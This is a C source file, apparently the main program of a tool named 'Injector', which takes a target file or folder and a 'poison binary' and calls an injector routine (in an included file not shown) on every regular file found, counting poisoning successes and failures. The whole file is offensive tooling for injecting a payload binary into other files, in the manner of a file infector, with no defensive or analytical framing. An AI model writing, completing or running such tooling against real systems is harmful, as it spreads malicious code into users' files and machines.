#include<stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdbool.h>
#include "injector.c"
#include "consts.h"


void banner(){
    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n" AC_NORMAL);
    fprintf(stdout, AC_GREEN "#\t\t\t\t\tInjector\t\t\t\t\t\t\t#\n" AC_NORMAL);
    fprintf(stdout, AC_GREEN "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n" AC_NORMAL);
}


void start_inject(char *path, char *poison){
    char full_path[100];
    DIR *directory;
    struct dirent *dir;
    struct stat buffer;
    int poison_success = 0;
    int poison_failed = 0;
    directory = opendir(path);
    if (directory) {
        fprintf(stdout, AC_YELLOW "[*] start injecting poison to directory: '%s'\n" AC_NORMAL, path);
        while ((dir = readdir(directory)) != NULL)
        {
             if (dir->d_type == DT_REG )
            {
                snprintf(full_path, 100, "%s/%s", path, dir->d_name);
                if(injector(full_path, poison) == 0){
                    poison_success++;
                    continue;
                }
                poison_failed++;
                //sleep(1);
            }
        }
        closedir(directory);
        fprintf(stdout, AC_GREEN "[*] Summary:\n[+] Total files scanned: %d\n[+] poison success: %d\n[+] poison failed: %d\n" AC_NORMAL, poison_success+poison_failed, poison_success, poison_failed);
        return;
    } 
    int ret_code = stat(path, &buffer) == 0 ? true : false;
    if (ret_code){
        injector(path, poison);
        return;
    }
    fprintf(stdout, AC_RED "[-] No such file or Directory: '%s'\n" AC_NORMAL, path);
}


int main(int argc, char *argv[])
{
    if (argc != 3){
        fprintf(stderr, AC_RED "Usage: <%s> target_(<folder>|<file>) <poison_binary>\n" AC_NORMAL, argv[0]);
        exit(0);
    }
    banner();
    char* target_path = argv[1];
    char* poison_path = argv[2]; 
    start_inject(target_path, poison_path);
    return 0;
}